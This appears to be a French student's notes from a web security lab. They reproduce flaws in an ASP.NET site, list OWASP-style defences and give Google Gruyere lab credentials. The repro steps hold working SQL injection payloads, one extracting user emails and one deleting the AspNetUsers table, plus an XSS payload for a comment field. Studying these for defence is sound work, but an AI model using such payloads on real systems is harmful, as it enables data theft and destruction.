## Problemes:
- recevoir de la publicité non sollicitée depuis leur inscription sur le site en question (leek emails)
    Repro: 
    1. login 
    2. Recherche
    3. %' OR 1=1 Union select Email FROM AspNetUsers '%a
    4. try login
   
- ils ont remarqué que certaines pages de commentaires ne réagissaient pas de manière normale, certaines pages affichent plusieurs fenêtres modales (pop-up)
    Repro:
    1. login
    2. go to Comments
    3. <a ONMOUSEOVER="alert(1)" href="#">XSS Attack!!</a>


- certains membres avaient disparus de leur base de données
    Repro: 
    1. login 
    2. Recherche
    3. %' OR 1=1; Delete FROM AspNetUsers where 1=1 OR Email like '%a
    4. try login

- gestion erreur
    Repro: 
    1. login 
    2. Recherche
    3. %' OR 1=1 Union select * FROM AspNetUsers '%a
    4. try login

## Verification:
- 10 risques OWASP
- Cross site scripting
- l’injection SQL
- DDOS
- l’ingénierie sociale
- vérifier si le site utilise encore des cookies
- mettre à jour HTML5 web storage
- l’identité basé sur les revendications (claims-based identity)
- déléguer l’authentification et l’autorisation (OpenID Connect)
- des restrictions de sécurité telles que CORS et HSTS permettent de mitiger les attaques CSRF

## Fix:
- Implementer OpenID Connect


test@test.ca
Allo1!
C:\"Program Files (x86)"\sqlite\sqlite-tools-win32-x86-3390400\sqlite3.exe


## Labo:
Google Gruyere:
ID: 573467018387912866384731286805310066172
https://google-gruyere.appspot.com/573467018387912866384731286805310066172/
userTest
1234


